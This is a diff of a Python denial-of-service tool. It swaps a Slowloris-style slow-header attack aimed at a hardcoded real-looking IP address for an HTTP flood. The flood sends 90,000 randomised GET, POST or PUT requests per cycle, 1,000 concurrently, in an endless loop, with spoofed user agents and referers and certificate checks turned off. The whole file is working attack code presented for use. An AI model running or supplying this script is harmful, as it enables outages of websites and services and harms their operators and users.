@@ -1,19 +1,22 @@
 # Libraries
-import ssl
 import time
 import random
-import socket
-from concurrent.futures import ThreadPoolExecutor
+import grequests
+import requests
+from urllib3.exceptions import InsecureRequestWarning
+
+# Disable SSL warnings
+requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
 # Constants
-CONNECTIONS_AMOUNT = 1500
-THREADS_AMOUNT = CONNECTIONS_AMOUNT * 0.35
-TARGET_ADDRESS = "92.222.117.57"
-TARGET_PORT = 80
-WAIT_TIME = 15
-TIMEOUT = 10
 VERBOSE = True
+TOTAL_REQUESTS = 90000
+CONCURRENT_REQUESTS = 1000
 
+METHOD = "GET"
+TARGET_URL = "https://example.com"
+WAIT_TIME = 5
+TIMEOUT = 30
 USER_AGENTS = [
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
@@ -71,103 +74,76 @@ def show_message(message):
         print(message)
 
 
-# Function to create a socket
-def create_socket(*args):
-    try:
-        # Create socket
-        connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        connection.settimeout(TIMEOUT)
+# Function to create requests
+def create_request(method, target_url, timeout, user_agent, referer):
+    content_length = random.randint(1, 500)
+    payload = {"x": random.randbytes(content_length)}
+    headers = {
+        "User-Agent": random.choice(USER_AGENTS),
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Connection": "keep-alive",
+        "Keep-Alive": str(random.randint(5, 1000)),
+        "Content-Type": "application/json",
+        "Content-Length": str(content_length),
+        "Referer": random.choice(REFERERS),
+    }
 
-        # Use SSL
-        if TARGET_PORT == 443:
-            ssl_context = ssl.create_default_context()
-            ssl_context.check_hostname = False
-            ssl_context.verify_mode = ssl.CERT_NONE
-            connection = ssl_context.wrap_socket(
-                connection, server_hostname=TARGET_ADDRESS
+    match method:
+        case "GET":
+            return grequests.get(
+                target_url, headers=headers, verify=False, timeout=timeout
             )
-
-        # Initiate a connection
-        connection.connect((TARGET_ADDRESS, TARGET_PORT))
-
-        # Send header
-        headers = [
-            f"GET /?{random.randint(0, 2000)} HTTP/1.1",
-            f"Accept-Language: en-US,en;q=0.9",
-            f"User-Agent: {random.choice(USER_AGENTS)}",
-            f"Referer: {random.choice(REFERERS)}",
-        ]
-        header = "\r\n".join(headers)
-        connection.send(header.encode("utf-8"))
-
-        # Return socket
-        return connection
-    except socket.error:
-        return None
-    except Exception as error:
-        show_message(f"An unexpected error occurred while creating a socket: {error}")
-
-
-# Function to create a set of sockets
-def create_socket_set(socket_amount):
-    with ThreadPoolExecutor(max_workers=THREADS_AMOUNT) as executor:
-        created_sockets = executor.map(create_socket, range(socket_amount))
-
-    # Return successful sockets
-    return list(filter(None, created_sockets))
-
-
-# Function to send data through a socket
-def send_data(connection, socket_set):
-    header = f"X-a: {random.randint(1, 5000)}\r\n"
-    try:
-        connection.send(header.encode("utf-8"))
-    except socket.error:
-        socket_set.remove(connection)
+        case "POST":
+            return grequests.post(
+                target_url, headers=headers, data=payload, verify=False, timeout=timeout
+            )
+        case "PUT":
+            return grequests.put(
+                target_url, headers=headers, data=payload, verify=False, timeout=timeout
+            )
+        case _:
+            raise ValueError("Invalid method")
 
 
 # Main function
 if __name__ == "__main__":
-    # Variables
-    socket_set = []
+    # Show initial message
+    show_message(f"Starting the attack on {TARGET_URL}...")
+    show_message(f"Sending {TOTAL_REQUESTS} requests each {WAIT_TIME} seconds...\n")
 
     # Main loop
     try:
-        # Create a set of sockets
-        show_message(f"Launching attack to {TARGET_ADDRESS} on port {TARGET_PORT}...")
-        show_message(f"Creating {CONNECTIONS_AMOUNT} connections...\n")
-        socket_set = create_socket_set(CONNECTIONS_AMOUNT)
-
         while True:
-            # Try to send data through each socket
-            show_message("Trying to send data through each active connection...\n")
-            with ThreadPoolExecutor(max_workers=THREADS_AMOUNT) as executor:
-                executor.map(send_data, socket_set)
-
-            # Create sockets if they have been closed
-            remaining_sockets = len(socket_set)
-            required_amount = CONNECTIONS_AMOUNT - remaining_sockets
-            show_message(
-                f"Data was sent through {remaining_sockets} active connections."
-            )
-
-            if required_amount > 0:
-                # Try to create new connections
-                show_message(
-                    f"It seems {required_amount} connections were lost in the process."
+            # Create requests
+            show_message(f"Creating {TOTAL_REQUESTS} requests...")
+            requests_list = [
+                create_request(
+                    METHOD,
+                    TARGET_URL,
+                    TIMEOUT,
+                    random.choice(USER_AGENTS),
+                    random.choice(REFERERS),
                 )
-                show_message(f"Trying to initiate missing connections...")
-                socket_set += create_socket_set(required_amount)
+                for n in range(TOTAL_REQUESTS)
+            ]
+            show_message("Requests created successfully.\n")
 
-                # Check if new connections were created
-                new_amount = len(socket_set) - remaining_sockets
-                if new_amount > 0:
-                    show_message(f"{new_amount} connections have been initiated.\n")
-                else:
-                    show_message("No new connections could be initiated.\n")
+            # Send requests
+            show_message(f"Sending {CONCURRENT_REQUESTS} requests...")
+            for index, response in grequests.imap_enumerated(
+                requests_list, size=CONCURRENT_REQUESTS
+            ):
+                try:
+                    if response.status_code == 200:
+                        show_message(f"The request {index} was sent successfully.")
+                except AttributeError:
+                    show_message(f"The request {index} could not be sent.")
 
             # Wait before continuing
-            show_message(f"Waiting {WAIT_TIME} seconds before continuing...")
+            del requests_list
+            show_message(f"Waiting {WAIT_TIME} seconds before continuing...\n")
             time.sleep(WAIT_TIME)
     except KeyboardInterrupt:
         show_message("The process has been stopped.")
